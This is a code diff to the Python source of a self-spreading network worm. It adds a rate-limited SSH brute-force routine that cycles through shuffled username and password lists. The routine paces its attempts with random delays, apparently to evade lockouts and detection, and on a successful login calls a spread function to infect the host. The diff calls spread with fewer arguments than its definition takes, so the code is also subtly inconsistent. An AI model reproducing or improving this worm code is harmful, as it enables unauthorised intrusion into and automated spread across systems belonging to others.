@@ -8,9 +8,9 @@ This worm does the following:
     next propagation cycle.
 """
 
-import sys, os, base64, uuid, socket, re, subprocess, threading, traceback, logging
+import sys, os, base64, uuid, socket, time, re, subprocess, threading, traceback, logging
 from datetime import datetime
-from random import shuffle
+from random import shuffle, uniform
 import concurrent.futures
 
 import netifaces
@@ -290,6 +290,7 @@ def initiate_worm():
                 #t.start()
                 #propagation_threads.append(t)
                 connect_via_ssh(host)
+                #connect_via_ssh_ratelimited(host)
                 infection_done = True
                 break
         if infection_done:
@@ -519,6 +520,57 @@ def connect_via_ssh(ip):
             except Exception as e:
                 logger.info(f"SSH connection error on {ip}: {str(e)}")
                 return
+
+def connect_via_ssh_ratelimited(ip):
+    """Attempt SSH login to a target IP using credential lists with rate-limiting and random delays."""
+    ssh = paramiko.SSHClient()
+    user_list = load_entries(USERNAME_DICT)
+    pass_list = load_entries(PASSWORD_DICT)
+    shuffle(user_list)
+    shuffle(pass_list)
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
+    # Rate limit parameters (allow up to 4 attempts per 120 seconds)
+    max_attempts = 4
+    window_seconds = 120
+    attempt_count = 0
+    window_start = time.time()
+
+    for user in user_list:
+        for passwd in pass_list:
+            # If we've reached the maximum number of attempts in the current window,
+            # sleep for the remaining time before continuing.
+            if attempt_count >= max_attempts:
+                elapsed = time.time() - window_start
+                if elapsed < window_seconds:
+                    sleep_time = window_seconds - elapsed
+                    logger.info(f"Rate limiting: sleeping for {sleep_time:.2f} seconds before next SSH attempt.")
+                    time.sleep(sleep_time)
+                attempt_count = 0
+                window_start = time.time()
+            
+            logger.info(f"Attempting SSH connection to {ip} with {user}:{passwd}")
+            try:
+                ssh.connect(ip, username=user, password=passwd,
+                            timeout=0.5, auth_timeout=0.5, banner_timeout=0.5,
+                            allow_agent=False, look_for_keys=False)
+                logger.error(f"SSH login succeeded on {ip} with {user}:{passwd}")
+                spread(ssh)
+                # After a successful infection, exit so that the new mutated copy takes over.
+                sys.exit(0)
+            except (AuthenticationException, BadHostKeyException):
+                logger.info("SSH authentication failed.")
+            except (SSHException, EOFError) as e:
+                logger.debug(f"SSH connection error on {ip}: {str(e)}")
+            except Exception as e:
+                logger.info(f"SSH connection error on {ip}: {str(e)}")
+                return
+
+            attempt_count += 1
+            
+            delay = uniform(1, 2)
+            logger.info(f"Delaying for {delay:.2f} seconds before next SSH attempt.")
+            time.sleep(delay)
 
 def spread(ssh, remote_os):
     """
